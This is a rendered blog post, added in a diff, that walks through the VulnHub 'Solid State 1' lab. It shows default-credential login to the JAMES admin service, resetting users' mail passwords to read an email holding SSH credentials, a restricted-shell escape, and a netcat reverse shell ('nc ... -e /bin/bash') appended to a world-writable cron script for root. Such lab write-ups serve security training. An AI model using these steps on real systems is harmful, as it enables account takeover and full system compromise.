@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Solid State 1
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Solid State 1" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: It was originally created for HackTheBox" />
+<meta property="og:description" content="Description: It was originally created for HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/solidstate1.html" />
+<meta property="og:url" content="http://localhost:4000/solidstate1.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/solidstate1.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-01-04T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/solidstate1.html" />
+<meta property="twitter:title" content="VulnHub - Solid State 1" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Solid State 1","dateModified":"2022-01-04T00:00:00-05:00","datePublished":"2022-01-04T00:00:00-05:00","url":"http://localhost:4000/solidstate1.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/solidstate1.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: It was originally created for HackTheBox","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Solid State 1</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>January 2022</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> It was originally created for HackTheBox</p>
+
+<p><strong>Author:</strong> Ch33z_plz</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell and read the flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/solidstate-1,261/">https://www.vulnhub.com/entry/solidstate-1,261/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>The following command performs a ping scan to discover the target machine on the local network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.0/24
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-04 13:56 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>192.168.179.185
+...
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>To detect open ports a full TCP port scan was performed with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.185 <span class="nt">-oG</span> nmap/all.tcp-ports.txt 
+...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+110/tcp  open  pop3
+119/tcp  open  nntp
+4555/tcp open  rsip
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>With the aim of discovering information about open ports running on the server, an aggressive scan was did with nmap, it enable the OS detection, version enumeration, script scanning and traceroute.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p22</span>,25,80,110,119,4555 <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-Pn</span> 192.168.179.185 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT     STATE SERVICE     VERSION                                                                                                                                  
+22/tcp   open  tcpwrapped                                                                                                                                           
+| ssh-hostkey:                                                                                                                                                      
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class="o">(</span>RSA<span class="o">)</span>                                                                                                      
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                     
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                   
+25/tcp   open  smtp        JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org <span class="o">(</span>192.168.179.1 <span class="o">[</span>192.168.179.1]<span class="o">)</span>, PIPELINING, ENHANCEDSTATUSCODES, 
+80/tcp   open  http        Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Home - Solid State Security 
+110/tcp  open  pop3        JAMES pop3d 2.3.2
+119/tcp  open  nntp        JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
+4555/tcp open  james-admin JAMES Remote Admin 2.3.2
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>A web page is running in the web service, but was not possible to find valuable information.</p>
+
+<p><img src="/assets/images/solidstate/screenshot-1.png" alt="" /></p>
+
+<p>The directory brute forcing with gobuster also did not disclosed information that would help to compromise the system.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.185/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> html,php,txt
+...
+http://192.168.179.185/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.185/images/]
+http://192.168.179.185/about.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7182]                                    
+http://192.168.179.185/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7776]                                    
+http://192.168.179.185/services.html        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 8404]                                    
+http://192.168.179.185/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.185/assets/]
+http://192.168.179.185/README.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 963]                                     
+http://192.168.179.185/LICENSE.txt          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17128]                                   
+http://192.168.179.185/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]
+</code></pre></div></div>
+
+<h3 id="enumeration-on-port-4555">Enumeration on port 4555</h3>
+
+<p>By connecting on port 4545, we see that it service requires authentication, but using root as username and password we have successfull access.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
+Trying 192.168.179.185...
+Connected to 192.168.179.185.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login <span class="nb">id</span>:
+root
+Password:
+root
+Welcome root. HELP <span class="k">for </span>a list of commands
+</code></pre></div></div>
+
+<p>Executing the <strong>help</strong> command we can see the list of available commands to the root user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">help
+</span>Currently implemented commands:
+<span class="nb">help                                    </span>display this <span class="nb">help
+</span>listusers                               display existing accounts
+countusers                              display the number of existing accounts
+adduser <span class="o">[</span>username] <span class="o">[</span>password]           add a new user
+verify <span class="o">[</span>username]                       verify <span class="k">if </span>specified user exist
+deluser <span class="o">[</span>username]                      delete existing user
+setpassword <span class="o">[</span>username] <span class="o">[</span>password]       sets a user<span class="s1">'s password
+setalias [user] [alias]                 locally forwards all email for '</span>user<span class="s1">' to '</span><span class="nb">alias</span><span class="s1">'
+showalias [username]                    shows a user'</span>s current email <span class="nb">alias
+</span>unsetalias <span class="o">[</span>user]                       unsets an <span class="nb">alias </span><span class="k">for</span> <span class="s1">'user'</span>
+setforwarding <span class="o">[</span>username] <span class="o">[</span>emailaddress] forwards a user<span class="s1">'s email to another email address
+showforwarding [username]               shows a user'</span>s current email forwarding
+unsetforwarding <span class="o">[</span>username]              removes a forward
+user <span class="o">[</span>repositoryname]                   change to another user repository
+shutdown                                kills the current JVM <span class="o">(</span>convenient when James is run as a daemon<span class="o">)</span>
+quit                                    close connection
+</code></pre></div></div>
+
+<p>We list the users by typing the <strong>listusers</strong> command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listusers
+Existing accounts 5
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+</code></pre></div></div>
+
+<p>We create the user <strong>s4rgaz</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adduser s4rgaz 123
+User s4rgaz added
+listusers
+Existing accounts 6
+user: james
+user: thomas
+user: john
+user: mindy
+user: s4rgaz
+user: mailadmin
+quit
+Bye
+Connection closed by foreign host.
+root@kali:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h3 id="enumeration-on-service-pop3">Enumeration on service pop3</h3>
+
+<p>By logging in to pop3 service as user <strong>s4rgaz</strong>, we have successful access, so we can manage the users to be able to access to pop3 service.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110
+Trying 192.168.179.185...
+Connected to 192.168.179.185.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+user s4rgaz
++OK
+pass 123
++OK Welcome s4rgaz
+list
++OK 0 0
+<span class="nb">.</span>
+quit
++OK Apache James POP3 Server signing off.
+Connection closed by foreign host.
+root@kali:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>We go back to the service running on port 4545 and change john’s password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
+Trying 192.168.179.185...
+Connected to 192.168.179.185.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login <span class="nb">id</span>:
+root
+Password:
+root
+Welcome root. HELP <span class="k">for </span>a list of commands
+setpassword john john
+Password <span class="k">for </span>john reset
+</code></pre></div></div>
+
+<p>We log in on pop3 service as user john, in the mail it indicates that access to <strong>mindy</strong> is restricted.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110
+Trying 192.168.179.185...
+Connected to 192.168.179.185.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+user john
++OK
+pass john
++OK Welcome john
+list
++OK 1 743
+1 743
+<span class="nb">.</span>
+retr 1
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: john@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
+          <span class="k">for</span> &lt;john@localhost&gt;<span class="p">;</span>
+          Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: New Hires access
+John, 
+
+Can you please restrict mindy<span class="s1">'s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
+
+Thank you in advance.
+
+Respectfully,
+James
+</span></code></pre></div></div>
+
+<p>Then we change mindy’s password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
+Trying 192.168.179.185...
+Connected to 192.168.179.185.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login <span class="nb">id</span>:
+root
+Password:
+root
+Welcome root. HELP <span class="k">for </span>a list of commands
+setpassword mindy mindy
+Password <span class="k">for </span>mindy reset
+</code></pre></div></div>
+
+<p>We login as user <strong>mindy</strong> on pop3 service and see her SSH login credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110                                                                                                                  
+Trying 192.168.179.185...                                                                                                                                           
+Connected to 192.168.179.185.                                                                                                                                       
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>                                                                                                                                           
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready                                                                                                          
+user mindy                                                                                                                                                          
++OK                                                                                                                                                                 
+pass mindy                                                                                                                                                          
++OK Welcome mindy                                                                                                                                                   
+list                                                                                                                                                                
++OK 2 1945                                                                                                                                                          
+1 1109                                                                                                                                                              
+2 836                                                                                                                                                               
+<span class="nb">.</span> 
+retr 2
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
+          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
+          Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<p>We access to the server via SSH as user <strong>mindy</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> mindy 192.168.179.185 
+mindy@192.168.179.185<span class="s1">'s password: 
+Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+mindy@solidstate:~$
+</span></code></pre></div></div>
+
+<p>We found the flag in her home directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls
+</span>bin  user.txt
+mindy@solidstate:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+914d0a4ebc1777889b5b89a23f556fd75
+mindy@solidstate:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>By trying to execute some system commands, we see that we are under a restricted shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">cd </span>bin/
+<span class="nt">-rbash</span>: <span class="nb">cd</span>: restricted
+mindy@solidstate:~<span class="nv">$ </span>ip addr
+<span class="nt">-rbash</span>: ip: <span class="nb">command </span>not found
+mindy@solidstate:~
+</code></pre></div></div>
+
+<p>To bypass the jailed shell, we type <strong>bash -i</strong> to the SSH command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> mindy 192.168.179.185 <span class="s2">"bash -i"</span>                          
+mindy@192.168.179.185<span class="s1">'s password: 
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
+id
+uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
+</span></code></pre></div></div>
+
+<p>Now we can run any system command, a python script was found in the <strong>/opt</strong> directory, probably a cron job is running this file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-xr-x  3 root root 4096 Aug 22  2017 <span class="nb">.</span>
+drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
+drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
+<span class="nt">-rwxrwxrwx</span>  1 root root  105 Aug 22  2017 tmp.py
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">cat </span>tmp.py
+<span class="nb">cat </span>tmp.py
+<span class="c">#!/usr/bin/env python</span>
+import os
+import sys
+try:
+     os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
+except:
+     sys.exit<span class="o">()</span>
+
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="cron-job">Cron Job</h3>
+
+<p>We add the following instruction to the end of the <strong>tmp.py</strong> file, when the cron job executes the script, it will try to connect to my attacking machine, giving us a root shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"os.system('nc 192.168.179.1 1337 -e /bin/bash')"</span> <span class="o">&gt;&gt;</span> tmp.py
+</code></pre></div></div>
+
+<p>We set up a netcat listener on port 1337, wait a moment and we have a root shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.185] 40466
+script <span class="nt">-qc</span> /bin/bash /dev/null
+root@solidstate:~# <span class="nb">ls
+ls
+</span>root.txt
+root@solidstate:~# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+b4c9723a28899b1c45db281d99cc87c9
+root@solidstate:~#
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
